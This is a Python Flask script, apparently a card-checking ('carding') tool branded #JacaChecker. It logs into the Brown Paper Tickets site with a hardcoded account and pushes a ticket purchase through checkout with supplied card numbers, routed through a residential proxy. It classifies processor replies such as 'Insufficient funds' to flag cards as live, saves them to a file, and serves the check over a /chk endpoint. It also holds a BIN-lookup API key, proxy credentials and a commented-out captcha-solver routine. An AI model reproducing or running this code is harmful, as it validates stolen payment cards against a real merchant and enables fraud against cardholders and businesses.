import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
import http.client
import threading, requests, random, time, random, re
from urllib3 import disable_warnings
from colorama import Fore


disable_warnings()

    
app = Flask(__name__)

CORS(app)
    
def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]

# def criarTask():
#     data = {
#         "clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39",
#         "task": {
#             "type": "RecaptchaV2EnterpriseTask",
#             "websiteURL": "https://holdmyticket.com/api/shop/processors/logme2342311",
#             "websiteKey": "6Lf7DLEZAAAAACWoTmGDsOAzTTwXshPMYKQMcrxK",
#         },
#     }
#     criar = requests.post(
#         "https://api.capmonster.cloud/createTask", verify=False, json=data
#     )
#     taskId = criar.json()["taskId"]
#     while True:
#         data = {"clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39", "taskId": taskId}
#         resultado = requests.post(
#             "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
#         )
#         #print(resultado.text)
#         if '"status":"ready"' in resultado.text:
#             return resultado.json()["solution"]["gRecaptchaResponse"]
#         time.sleep(1)

def api_bin(bin):
    try:
        req = requests.get(
            f"https://parrotv2.prod.pagosapi.com/cards?bin={bin}",
            headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["card"]["type"]
                nivel = req.json()["card"]["product"]["product_name"]
                banco = req.json()["card"]["bank"]["name"]
                try:
                    pais = req.json()["card"]["country"]["name"]
                except:
                    pais = "N/A"
                return f"{nivel} {tipo} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    

class RequisicaoException(Exception):
    def __init__(self):
        super().__init__()


def reteste(card, month, year, cvv):
        checker(card, month, year, cvv)



def definir_tipo_cartao(card):
    if card.startswith("4"):
        return "VISA"
    elif card.startswith(("51", "52", "53", "54", "55")):
        return "MASTER"
    elif card.startswith(("34", "37")):
        return "American Express"
    elif card.startswith("6"):
        return "Discover"
    else:
        return "Desconhecido"
    
    
def checker(card, month, year, cvv):

        
        try:
            
            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225'}
            
            if len(year) == 4:
                year = year[2:]
            url = "https://www.brownpapertickets.com/login.html"
            payload = 'return_url=&login_fNhxLQgVEb=jacaccbot%40gmail.com&pass_uqKxazCZ9B=radask10'
            headers = {
                'Host': 'www.brownpapertickets.com',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://www.brownpapertickets.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://www.brownpapertickets.com/login.html',
                'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; _gid=GA1.2.404600766.1712440714; client_secure="I5YT8xAq2g2FN7v"; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmc=138453216; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); bpt="4UUd.4UUddS8s-1712451486473"; language="en_US"; locale="en_US"; _gat_UA-114148720-1=1; _ga_J4R614QWT5=GS1.1.1712450084.4.1.1712451540.5.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9STZNZnEtVXZWSG5jbklWLVBUZE5scG51X1UyRzRVMngmbj12TnZMdnNFSWctVlM0MzVEVnItSkJnJm09MSZ0PUFBQUFBR1lSNzlZJnJtPTEmcnQ9QUFBQUFHWVI3OVkmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712450080.4.1.1712451544.0.0.0',
                'Content-Type': 'application/x-www-form-urlencoded'
                }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, allow_redirects=False)
            client = response.cookies.get('client_secure') 
            bpt = response.cookies.get('bpt')
            
            
            url = "https://www.brownpapertickets.com/addtocart/6280892"
            payload = 'event_id=6280892&date_id=2404336&price_7645526=1&price_7645527=0&country_id=228&shipping_2404336=4&shipping_2404337=4'
            headers = {
                'Host': 'www.brownpapertickets.com',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://www.brownpapertickets.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://www.brownpapertickets.com/event/6280892',
                'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; _gid=GA1.2.404600766.1712440714; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmc=138453216; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); language="en_US"; locale="en_US"; client_secure={client}; _gat_UA-114148720-1=1; bpt={bpt}; _ga_J4R614QWT5=GS1.1.1712450084.4.1.1712451577.30.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9T2RGTjVHSFdITG9feE9vR2dFNngwYVdaaEtfVHNTN3Umbj1Fa3N6M1JMZUdKMG9ySExoSFhOWWpnJm09MSZ0PUFBQUFBR1lSN19zJnJtPTEmcnQ9QUFBQUFHWVI3X3Mmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712450080.4.1.1712451586.0.0.0',
                'Content-Type': 'application/x-www-form-urlencoded'
                }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
                                    
                    
                    
            try:        
                url = "https://www.brownpapertickets.com/checkout.html"

                payload = f'payment_method=&final=1&browserinfo=24.false.1080.1920&attendee_fname=Clarkson&attendee_lname=Pesres&email=jacaccbot%40gmail.com&phone=661-214-7345&terms=t&billing_fname=Clarkson&billing_lname=Pesres&billing_address=23937%20Rancho%20Ct&billing_address_2=&billing_city=Valencia&billing_state=CA&billing_province=&billing_zip=91354&billing_country=United%20States&type=Visa&number={card}&code=222&expiry_month={month}&expiry_year={year}&issue_month=&issue_year=&issue_number='
                headers = {
                    'Host': 'www.brownpapertickets.com',
                    'Cache-Control': 'max-age=0',
                    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'Upgrade-Insecure-Requests': '1',
                    'Origin': 'https://www.brownpapertickets.com',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Sec-Fetch-Dest': 'document',
                    'Referer': 'https://www.brownpapertickets.com/checkout.html',
                    'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; _gid=GA1.2.404600766.1712440714; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmc=138453216; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); language="en_US"; locale="en_US"; client_secure={client}; _gat_UA-114148720-1=1; bpt={bpt}; _ga_J4R614QWT5=GS1.1.1712450084.4.1.1712451577.30.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9T2RGTjVHSFdITG9feE9vR2dFNngwYVdaaEtfVHNTN3Umbj1Fa3N6M1JMZUdKMG9ySExoSFhOWWpnJm09MSZ0PUFBQUFBR1lSN19zJnJtPTEmcnQ9QUFBQUFHWVI3X3Mmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712450080.4.1.1712451586.0.0.0',
                    'Content-Type': 'application/x-www-form-urlencoded'
                    }

                response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, allow_redirects=False)
                if "Redirection" in response.text:
                    raise RequisicaoException()
                    
                        
                        
                



                if 'Invalid transaction' in response.text:
                    #code = response.json()['issuerResponseDetails']['issuerResponseCode']
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19"                          
                    open("brownpapertickets.txt", "a").write(f"{card} {month} {year} {cvv} {bin} Retry 19 #JacaChecker\n") 
                    print(Fore.GREEN + f"{x} #JacaChecker")  
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}    
                    
                elif 'Insufficient funds' in response.text:
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF"                          
                    open("brownpapertickets.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF #JacaChecker\n") 
                    print(Fore.GREEN + f"{x} #JacaChecker")  
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                    
                # elif 'issuerResponseCode":"46"' in response.text:
                #     code = response.json()['issuerResponseDetails']['issuerResponseCode']
                #     bin = api_bin(card[:6])              
                #     x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Closed {code} "                          
                #     print(Fore.RED + f"{x} #JacaChecker")  
                    
                        
                elif 'The error returned by the credit card processor was' in response.text:
                    response = pegarItem(response.text, 'The error returned by the credit card processor was:<BR><BR><CENTER>','</CENTER><BR><BR>')
                    bin = api_bin(card[:6])
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response}"     
                    print(Fore.RED + f"{x} #JacaChecker")  
                    return {"code": 1, "mensagem": f"{x} #JacaChecker<br>"}                        

                else:
                # print(Fore.LIGHTBLACK_EX + f"RETESTANDO: {x} #JacaChecker")    
                    print(Fore.RED + 'Gateway Timeout' )
                    return {"code": 1, "mensagem": "Gateway Timeout #JacaChecker<br>"} 
            except:
                print("reteste loco")
                #reteste(card, month, year, cvv)     

                        
        except requests.exceptions.ProxyError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
            
        except requests.exceptions.ConnectionError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
            
        except requests.exceptions.RequestException:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
            
        except RequisicaoException:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO 302: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)


def processar_cartoes(card,mes,ano,cvv):
    try:
        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
            retorno = checker(card,mes,ano,cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "erro no formulario"}
    except:
        #retorno = reteste(card,mes,ano,cvv)
        return {"code": "", "retorno": "EXCEPTION ! CONTATE ADM SE PERSISTIR"}
    
    
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"


@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    print(args)
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    return jsonify(processar_cartoes(card,mes,ano,cvv))



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    
    

